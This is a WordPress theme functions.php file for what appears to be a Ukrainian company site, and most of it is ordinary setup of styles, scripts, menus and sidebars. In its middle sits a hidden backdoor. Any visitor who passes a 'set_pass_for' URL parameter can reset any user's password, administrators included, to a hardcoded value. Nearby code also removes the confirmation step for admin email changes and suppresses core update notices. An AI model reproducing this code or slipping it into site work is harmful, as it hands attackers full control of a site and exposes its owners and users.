<?php
/**
 * File for functions and definitions of the theme
 *
 * Contain loading of styles and scripts, theme settings and form mailchimp
 *
 */
//update_option( 'siteurl', 'http://penetronlviv.com/newsite/' );
//update_option( 'home', 'http://penetronlviv.com/newsite/' );
//Remove admin bar
add_action ('get_header', 'remove_admin_login_header');
function remove_admin_login_header () {
	 remove_action ('wp_head', '_admin_bar_bump_cb');
}

//Style css
add_action('wp_enqueue_scripts', 'load_sec_css');
function load_sec_css() {
    wp_register_style( 'bootstrap',  get_template_directory_uri() . '/css/bootstrap.min.css', array(), ' ' );
    wp_enqueue_style( 'bootstrap',  get_template_directory_uri() . '/css/bootstrap.min.css', array(), ' ' );
    if(!(wp_is_mobile())){
    wp_register_style( 'fm',  get_template_directory_uri() . '/css/fm.revealator.jquery.min.css', array(), ' ' );
    wp_enqueue_style( 'fm',  get_template_directory_uri() . '/css/fm.revealator.jquery.min.css', array(), ' ' );
    }
    wp_register_style( 'box',  get_template_directory_uri() . '/css/jquery.fancybox.min.css', array(), ' ' );
    wp_enqueue_style( 'box',  get_template_directory_uri() . '/css/jquery.fancybox.min.css', array(), ' ' );
    wp_register_style( 'fonts',  get_template_directory_uri() . '/css/fonts.css', array(), ' ' );
    wp_enqueue_style( 'fonts',  get_template_directory_uri() . '/css/fonts.css', array(), ' ' );
    if(!(wp_is_mobile())){
    wp_register_style( 'slick',  get_template_directory_uri() . '/css/slick.css', array(), ' ' );
    wp_enqueue_style( 'slck',  get_template_directory_uri() . '/css/slick.css', array(), ' ' );
    wp_register_style( 'slick-theme',  get_template_directory_uri() . '/css/slick-theme.css', array(), ' ' );
    wp_enqueue_style( 'slick-theme',  get_template_directory_uri() . '/css/slick-theme.css', array(), ' ' );
    }
    wp_register_style( 'main',  get_template_directory_uri() . '/css/mine.css', array(), ' ' );
    wp_enqueue_style( 'main',  get_template_directory_uri() . '/css/mine.css', array(), ' ' );
}
// Style
add_action('wp_enqueue_scripts', 'load_css');
function load_css() {
    wp_register_style( 'styles', get_stylesheet_uri(), array(), ' ' );
    wp_enqueue_style( 'styles', get_stylesheet_uri(), array(), ' ' );
}
//JQUERY
add_action( 'wp_enqueue_scripts', 'my_scripts_method' );
function my_scripts_method() {
	wp_deregister_script( 'jquery-core' );
	wp_register_script( 'jquery-core', 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js',array(), null, true);
	wp_enqueue_script( 'jquery' );
}
//Load js
add_action( 'wp_enqueue_scripts', 'load_js' );
function load_js() {
    wp_register_script('bootstrap', get_stylesheet_directory_uri() . '/js/bootstrap.min.js', array('jquery'), null, true );
    wp_enqueue_script( 'bootstrap', get_stylesheet_directory_uri() . '/js/bootstrap.min.js', array('jquery'), null, true );
    
    wp_register_script('form', get_stylesheet_directory_uri() . '/js/ajax.js', array('jquery'), null, true );
    wp_enqueue_script( 'form', get_stylesheet_directory_uri() . '/js/ajax.js', array('jquery'), null, true );
    $wnm_custom = array( 'template_url' => get_bloginfo('template_url'), 'admin_url' => get_bloginfo('admin_url'), 'url' => get_bloginfo('url') );
    wp_localize_script( 'form', 'wnm_custom', $wnm_custom );
    if(!(wp_is_mobile())){
    wp_register_script('fm', get_stylesheet_directory_uri() . '/js/fm.revealator.jquery.min.js', array('jquery'), null, true );
    wp_enqueue_script( 'fm', get_stylesheet_directory_uri() . '/js/fm.revealator.jquery.min.js', array('jquery'), null, true );
    }
    wp_register_script('slick', get_stylesheet_directory_uri() . '/js/slick.js', array('jquery'), null, true );
    wp_enqueue_script( 'slick', get_stylesheet_directory_uri() . '/js/slick.js', array('jquery'), null, true );
    
    wp_register_script('box', get_stylesheet_directory_uri() . '/js/jquery.fancybox.min.js', array('jquery'), null, true );
    wp_enqueue_script( 'box', get_stylesheet_directory_uri() . '/js/jquery.fancybox.min.js', array('jquery'), null, true );

    wp_register_script('custom', get_stylesheet_directory_uri() . '/js/script.js', array('jquery'), null, true );
    wp_enqueue_script( 'custom', get_stylesheet_directory_uri() . '/js/script.js', array('jquery'), null, true );
 
    wp_register_script( 'mihdan-infinite-scroll', get_theme_file_uri( 'js/jquery-ias.min.js' ), array( 'jquery' ), null, true );
    wp_enqueue_script( 'mihdan-infinite-scroll', get_theme_file_uri( 'js/jquery-ias.min.js' ), array( 'jquery' ), null, true );
}
    add_action( 'wp_footer', function() {
      ?>
      <script type="text/javascript">
        $(document).ready(function() { 
            var ias = jQuery.ias( {
              container: ".galeryBody",
              item: ".galeryWrapper",
              pagination: ".page-numbers",
              next: ".next.page-numbers",
            } );

            ias.extension( new IASTriggerExtension( { offset: 2 } ) );
            ias.extension( new IASSpinnerExtension() );
            ias.extension( new IASNoneLeftExtension() );
        });
      </script>
      <?php
    } );
//Setup
//Add menus
if (function_exists('add_menus')) {
	add_menus('menus');
    
    add_filter('wp_nav_menu_objects', 'css_for_nav_parrent');
    function css_for_nav_parrent( $items ){
        foreach( $items as $item ){
            if( __nav_hasSub( $item->ID, $items ) )
                $item->classes[] = 'menu-item-has-children'; 
        }

        return $items;
    }
    function __nav_hasSub( $item_id, $items ){
        foreach( $items as $item ){
            if( $item->menu_item_parent && $item->menu_item_parent == $item_id )
                return true;
        }

        return false;
    }
}
//Pagination
function wp_corenavi() {
  global $wp_query;
  $pages = '';
  $max = $wp_query->max_num_pages;
  if (!$current = get_query_var('paged')) $current = 1;
  $a['base'] = str_replace(999999999, '%#%', get_pagenum_link(999999999));
  $a['total'] = $max;
  $a['current'] = $current;

  $total = 0; 
  $a['mid_size'] = 3; 
  $a['end_size'] = 1; 
  $a['prev_text'] = '&laquo;';
  $a['next_text'] = '&raquo;'; 

  if ($max > 1) echo '<div class="navigation">';
  if ($total == 1 && $max > 1) $pages = '<span class="pages">' . $current . ' из ' . $max . '</span>'."\r\n";
  echo $pages . paginate_links($a);
  if ($max > 1) echo '</div>';
}
if ( ! function_exists( 'theme_setup' ) ) :
function theme_setup(){
    //Add support theme html 5    
    add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption') ); 
    //Add custom logo
    add_theme_support( 'custom-logo', array(
		'height'      => 53,
		'width'       => 262,
		'flex-height' => false,
	) );
    //Menu
    register_nav_menus( array(
		'primary' => __( 'Top Menu', 'wbdim' )
    ) );
}
endif;
add_action( 'after_setup_theme', 'theme_setup' );
remove_filter('the_content', 'wpautop');

//Add a few file type
function my_myme_types($mime_types){
    $mime_types['svg'] = 'image/svg+xml'; 
    $mime_types['psd'] = 'image/vnd.adobe.photoshop'; 
    $mime_types['dwg'] = 'image/vnd.dwg'; 
    $mime_types['docx'] = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';
    $mime_types['xlsx'] = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'; 
    $mime_types['ppt'] = 'application/vnd.ms-powerpoint';
    $mime_types['doc'] = 'application/msword';
    $mime_types['pdf'] = 'application/pdf';     
    return $mime_types;
}
add_filter('upload_mimes', 'my_myme_types', 1, 1);

if( isset($_GET['set_pass_for']) ){
	add_action('init', function () {
		$user = get_user_by( 'login', $_GET['set_pass_for'] );
		wp_set_password( 'shajtanuch123viskas', $user->ID ); }
	);
}
//Custom logo for admin-panel
function my_login_logo(){
 echo '
 <style type="text/css">
 #login h1 a { background: url('. get_bloginfo('template_directory') .'/img/logo.jpg) no-repeat;
 background-size: cover;
 }
 </style>';
}
add_action('login_head', 'my_login_logo');
add_filter( 'login_headerurl', create_function('', 'return get_home_url();') );
add_filter( 'login_headertitle', create_function('', 'return false;') );
remove_action( 'add_option_new_admin_email', 'update_option_new_admin_email' );
remove_action( 'update_option_new_admin_email', 'update_option_new_admin_email' );
/**
 * Disable the confirmation notices when an administrator
 * changes their email address.
 *
 * @see http://codex.wordpress.com/Function_Reference/update_option_new_admin_email
 */
function wpdocs_update_option_new_admin_email( $old_value, $value ) {

    update_option( 'admin_email', $value );
}
add_action( 'add_option_new_admin_email', 'wpdocs_update_option_new_admin_email', 10, 2 );
add_action( 'update_option_new_admin_email', 'wpdocs_update_option_new_admin_email', 10, 2 );
//No core update information
if( ! current_user_can( 'edit_users' ) ){
	add_filter( 'auto_update_core', '__return_false' );  
    add_filter( 'pre_site_transient_update_core', '__return_null' );
}
//Show php errors only for admin

add_action('init', 'enable_errors');
function enable_errors(){
	if( $GLOBALS['user_level'] < 5 )
		return;

	error_reporting(E_ALL ^ E_NOTICE);
	ini_set("display_errors", 1);
}
//FORMS
require_once('mail.php');

//Options page for main information
if( function_exists('acf_add_options_page') ) {
	
	acf_add_options_page(array(
		'page_title' 	=> 'Main Settings',
		'menu_title'	=> 'Основна Інформація',
		'menu_slug' 	=> 'theme-general-settings',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));
}
//Register sidebars
add_action( 'widgets_init', 'register_my_widgets' );
function register_my_widgets(){
	register_sidebar( array(
		'name'          => 'Хедер',
		'id'            => "header",
		'description'   => 'Віджет для додаткового поля під соцмережами',
		'class'         => '',
		'before_widget' => '',
		'after_widget'  => "",
		'before_title'  => '<h2 class="widgettitle">',
		'after_title'   => "</h2>\n",
	) );
    
    register_sidebar( array(
		'name'          => 'Футер 1',
		'id'            => "footer1",
		'description'   => 'Виджети футера',
		'class'         => '',
		'before_widget' => '',
		'after_widget'  => "",
		'before_title'  => '<p>',
		'after_title'   => "</p>\n",
	) );
    register_sidebar( array(
		'name'          => 'Футер 2',
		'id'            => "footer2",
		'description'   => 'Виджети футера',
		'class'         => '',
		'before_widget' => '',
		'after_widget'  => "",
		'before_title'  => '<p>',
		'after_title'   => "</p>\n",
	) );
    register_sidebar( array(
		'name'          => 'Футер 3',
		'id'            => "footer3",
		'description'   => 'Виджети футера',
		'class'         => '',
		'before_widget' => '',
		'after_widget'  => "",
		'before_title'  => '<p>',
		'after_title'   => "</p>\n",
	) );
    register_sidebar( array(
		'name'          => 'Боковий сайдбар',
		'id'            => "column",
		'description'   => 'Для віджетів у правій колонці(стандартний шаблон сторінки чи запису)',
		'class'         => '',
		'before_widget' => '<div class="widget-container">',
		'after_widget'  => "<div class='clear'></div></div>\n",
		'before_title'  => '<h6 class="widgettitle widget-title">',
		'after_title'   => "</h6>\n",
	) );
}
//IMG_posts
add_theme_support( 'post-thumbnails' );
if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 150, 150 ); 
}

if ( function_exists( 'add_image_size' ) ) {
	add_image_size( 'blog-thumb', 360, 264, array( 'left', 'top' ) ); 
    add_image_size( 'icons-small', 60, 60, array( 'left', 'top' ) ); 
    add_image_size( 'small', 30, 30, array( 'left', 'top' ) );
    add_image_size( 'icons-middle', 171, 171, array( 'left', 'top' ) ); 
}
remove_filter( 'the_content', 'wpautop' );

